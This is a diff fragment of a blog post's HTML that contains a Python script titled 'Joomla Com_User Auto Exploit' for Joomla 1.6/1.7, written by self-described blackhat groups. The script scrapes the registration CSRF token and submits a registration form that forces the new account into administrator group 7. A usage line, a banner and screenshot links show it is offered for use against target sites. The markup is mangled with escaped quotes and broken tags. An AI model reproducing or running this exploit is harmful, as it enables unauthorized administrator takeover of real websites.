-</span><span class='line'>    <span class="n">post</span><span class="p">[</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">jform</span><span class="p">[</span><span class="n">name</span><span class="p">]</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;]</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">SunDi3yansyah</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">post</span><span class="p">[</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">jform</span><span class="p">[</span><span class="n">username</span><span class="p">]</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;]</span> <span class="o">=</span> <span class="n">user</span>
-</span><span class='line'>    <span class="n">post</span><span class="p">[</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">jform</span><span class="p">[</span><span class="n">password1</span><span class="p">]</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;]</span> <span class="o">=</span> <span class="n">pwd1</span>
-</span><span class='line'>    <span class="n">post</span><span class="p">[</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">jform</span><span class="p">[</span><span class="n">password2</span><span class="p">]</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;]</span> <span class="o">=</span> <span class="n">pwd1</span>
-</span><span class='line'>    <span class="n">post</span><span class="p">[</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">jform</span><span class="p">[</span><span class="n">email1</span><span class="p">]</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;]</span> <span class="o">=</span> <span class="n">email</span>
-</span><span class='line'>    <span class="n">post</span><span class="p">[</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">jform</span><span class="p">[</span><span class="n">email2</span><span class="p">]</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;]</span> <span class="o">=</span> <span class="n">email</span>
-</span><span class='line'>    <span class="n">post</span><span class="p">[</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">jform</span><span class="p">[</span><span class="n">groups</span><span class="p">][]</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;]</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="mi">7</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">post</span><span class="p">[</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">option</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;]</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">com_users</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">post</span><span class="p">[</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">task</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;]</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">registration</span><span class="o">.</span><span class="n">register</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">post</span><span class="p">[</span><span class="n">token</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
-</span><span class='line'>    <span class="n">p2</span> <span class="o">=</span> <span class="n">xsec</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="o">+&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">option</span><span class="o">=</span><span class="n">com_users</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">view</span><span class="o">=</span><span class="n">registration</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="n">data</span><span class="o">=</span><span class="n">urllib</span><span class="o">.</span><span class="n">urlencode</span><span class="p">(</span><span class="n">post</span><span class="p">))</span>
-</span><span class='line'>    <span class="n">x4</span> <span class="o">=</span> <span class="n">xsec</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span><span class="o">+&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="o">/</span><span class="n">component</span><span class="o">/</span><span class="n">users</span><span class="o">/</span><span class="err">?</span><span class="n">view</span><span class="o">=</span><span class="n">registration</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">layout</span><span class="o">=</span><span class="n">complete</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
-</span><span class='line'>
-</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">xsec</span> <span class="o">=</span> <span class="n">sec4ever</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
-</span><span class='line'><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">5</span><span class="p">:</span>
-</span><span class='line'>    <span class="n">target</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-</span><span class='line'>    <span class="n">user</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
-</span><span class='line'>    <span class="n">pwd1</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
-</span><span class='line'>    <span class="n">email</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span>
-</span><span class='line'>    <span class="n">one</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">pwd1</span><span class="p">,</span><span class="n">pwd2</span><span class="p">,</span><span class="n">email</span><span class="p">)</span>
-</span><span class='line'>    <span class="n">ex</span> <span class="o">=</span> <span class="n">exploit</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="n">pwd1</span><span class="p">,</span><span class="n">pwd2</span><span class="p">,</span><span class="n">email</span><span class="p">)</span>
-</span><span class='line'>    <span class="k">print</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span> <span class="o">*</span> <span class="n">Go</span> <span class="n">To</span> <span class="n">Your</span> <span class="n">Email</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">Active</span> <span class="n">Then</span> <span class="n">Login</span> \<span class="n">n</span> <span class="o">*</span> <span class="n">Username</span><span class="p">:</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">+</span><span class="n">user</span><span class="o">+&amp;</span><span class="n">lsquo</span><span class="p">;</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">Password</span><span class="p">:</span> <span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="o">+</span><span class="n">pwd1</span>
-</span><span class='line'><span class="k">else</span><span class="p">:</span>
-</span><span class='line'>    <span class="k">print</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Usage</span><span class="p">:</span> <span class="n">python</span> <span class="n">sbh</span><span class="o">.</span><span class="n">py</span> <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">&quot;http://target.com/&quot;</span><span class="o">&gt;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">target</span><span class="o">.</span><span class="n">com</span><span class="o">/&lt;/</span><span class="n">a</span><span class="o">&gt;</span> <span class="n">usermu</span> <span class="n">passwordmu</span> <span class="n">emailmu</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
-</span></code></pre></td></tr></table></div></figure></p>
+<p>{% codeblock sbh.py %}</p>
+
+<h1>!/usr/bin/python</h1>
+
+<h1>Joomla Com_User Auto Exploit</h1>
+
+<h1>By xSecurity</h1>
+
+<h1>Modif Sign by SunDi3yansyah | Surabaya Blackhat</h1>
+
+<p>import requests as sec4ever, re, urllib, sys, os
+from threading import Thread
+from time import sleep
+def cls():
+    os.system([&lsquo;clear&rsquo;,&lsquo;cls&rsquo;][os.name ==&lsquo;nt&rsquo;])</p>
+
+<p>cls()
+print &lsquo;&rsquo;&#8217;</p>
+
+<hr />
+
+<p>  / <em><strong>| _   _ _ </strong> __ </em>| |<strong>   </strong> _ _   _  <strong> _  | </strong> )| | <strong> _  </strong><em>| | </em>| |<strong>   </strong> <em>| |</em>
+  _<strong> | | | | &lsquo;</strong>/ <em><code>| '_ \ / _</code> | | | |/ </em><code>| |  _ \| |/ _</code> |/ <strong>| |/ / &rsquo;<em> \ / </em>` | </strong>|
+   <strong><em>) | |</em>| | | | (<em>| | |</em>) | (<em>| | |</em>| | (<em>| | | |</em>) | | (_| | (</strong>|   &lt;| | | | (<em>| | |</em>
+  |<strong><em><em>/ _</em>,</em>|<em>|  _</em>,<em>|</em>.</strong>/ _<em>,</em>|_<em>, |_</em>,<em>| |</em><strong><em>/|</em>|_<em>,</em>|_</strong>|<em>|__| |</em>|_<em>,</em>|_<em>|
+                                     |</em><strong>/                                               <br/>
+                                              _      _             <br/>
+                        |  _  <em>..</em>.<em>  </em>|<em> _  |</em>) _  |_) </strong>|<em><em>|</em> _ .</em>
+                        |<em>(/</em>(<em>|| | |  |</em>(<em>) |</em>)(/<em> |</em>)(/<em>|</em> |<em>(/</em>|
+        &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;
+Joomla Version [1.6|1.7] [Com_User] Auto Exploit</p>
+
+<h2>Require Need Install Requests Python Package (Cari di google)</h2>
+
+<h2>Surabaya Blackhat | Surabaya Hackerlink | Yogyakarta Blackhat</h2>
+
+<p>Please wait&hellip;&lsquo;&rsquo;&#8217;</p>
+
+<p>pwd2 = &lsquo;fio3jfiej9cewc9c9w0eufew9u&rsquo;
+def one(target,pwd1,pwd2,email):
+    # Wrong Password
+    x1 = xsec.get(target+&lsquo;/index.php?option=com_users&amp;view=registration&rsquo;)
+    token = re.findall(&lsquo;type=&ldquo;hidden&rdquo; name=&ldquo;(.*?)&rdquo; value=&ldquo;1&rdquo;&rsquo;, x1.text)
+    post = {}
+    post[&ldquo;jform[name]&rdquo;] = &lsquo;SunDi3yansyah&rsquo;
+    post[&ldquo;jform[username]&rdquo;] = user
+    post[&ldquo;jform[password1]&rdquo;] = pwd1
+    post[&ldquo;jform[password2]&rdquo;] = pwd2
+    post[&ldquo;jform[email1]&rdquo;] = email
+    post[&ldquo;jform[email2]&rdquo;] = email
+    post[&ldquo;jform[groups][]&rdquo;] = &ldquo;7&rdquo;
+    post[&ldquo;option&rdquo;] = &ldquo;com_users&rdquo;
+    post[&ldquo;task&rdquo;] = &ldquo;registration.register&rdquo;
+    post[token[0]] = &ldquo;1&rdquo;
+    p1 = xsec.post(target+&lsquo;/index.php?option=com_users&amp;view=registration&rsquo;, data=urllib.urlencode(post))
+    x2 = xsec.get(target+&lsquo;/index.php/component/users/?view=registration&amp;layout=complete&rsquo;)</p>
+
+<p>def exploit(target,pwd1,pwd2,email):
+    # Wrong Password
+    x3 = xsec.get(target+&lsquo;/index.php?option=com_users&amp;view=registration&rsquo;)
+    token = re.findall(&lsquo;type=&ldquo;hidden&rdquo; name=&ldquo;(.*?)&rdquo; value=&ldquo;1&rdquo;&rsquo;, x3.text)
+    post = {}
+    post[&ldquo;jform[name]&rdquo;] = &lsquo;SunDi3yansyah&rsquo;
+    post[&ldquo;jform[username]&rdquo;] = user
+    post[&ldquo;jform[password1]&rdquo;] = pwd1
+    post[&ldquo;jform[password2]&rdquo;] = pwd1
+    post[&ldquo;jform[email1]&rdquo;] = email
+    post[&ldquo;jform[email2]&rdquo;] = email
+    post[&ldquo;jform[groups][]&rdquo;] = &ldquo;7&rdquo;
+    post[&ldquo;option&rdquo;] = &ldquo;com_users&rdquo;
+    post[&ldquo;task&rdquo;] = &ldquo;registration.register&rdquo;
+    post[token[0]] = &ldquo;1&rdquo;
+    p2 = xsec.post(target+&lsquo;/index.php?option=com_users&amp;view=registration&rsquo;, data=urllib.urlencode(post))
+    x4 = xsec.get(target+&lsquo;/index.php/component/users/?view=registration&amp;layout=complete&rsquo;)</p>
+
+<p>xsec = sec4ever.session()
+if len(sys.argv) == 5:
+    target = sys.argv[1]
+    user = sys.argv[2]
+    pwd1 = sys.argv[3]
+    email = sys.argv[4]
+    one(target,pwd1,pwd2,email)
+    ex = exploit(target,pwd1,pwd2,email)
+    print &lsquo; * Go To Your Email &amp; Active Then Login \n * Username: &rsquo;+user+&lsquo; &amp; Password: &rsquo;+pwd1
+else:
+    print &ldquo;Usage: python sbh.py <a href="http://target.com/">http://target.com/</a> usermu passwordmu emailmu&rdquo;
+{% endcodeblock %}</p>
 
 <h3>Screenshot</h3>
 
-<p><img class="<a" src="href="http://i40.photobucket.com/albums/e228/sundi3yansyah/WAzeF5n_zpsa0d8f316.png">http://i40.photobucket.com/albums/e228/sundi3yansyah/WAzeF5n_zpsa0d8f316.png</a>&#8221; title=&#8221;Joomla Com_User Auto Exploit with Python&#8221; ></p>
+<p>{% img <a href="http://i40.photobucket.com/albums/e228/sundi3yansyah/WAzeF5n_zpsa0d8f316.png">http://i40.photobucket.com/albums/e228/sundi3yansyah/WAzeF5n_zpsa0d8f316.png</a> Joomla Com_User Auto Exploit with Python %}</p>
 
-<p><img class="<a" src="href="http://i40.photobucket.com/albums/e228/sundi3yansyah/L9F0YoC_zps2111c6a9.png">http://i40.photobucket.com/albums/e228/sundi3yansyah/L9F0YoC_zps2111c6a9.png</a>&#8221; title=&#8221;Joomla Com_User Auto Exploit with Python&#8221; ></p>
+<p>{% img <a href="http://i40.photobucket.com/albums/e228/sundi3yansyah/L9F0YoC_zps2111c6a9.png">http://i40.photobucket.com/albums/e228/sundi3yansyah/L9F0YoC_zps2111c6a9.png</a> Joomla Com_User Auto Exploit with Python %}</p>
 
 <h3>Video</h3>
 
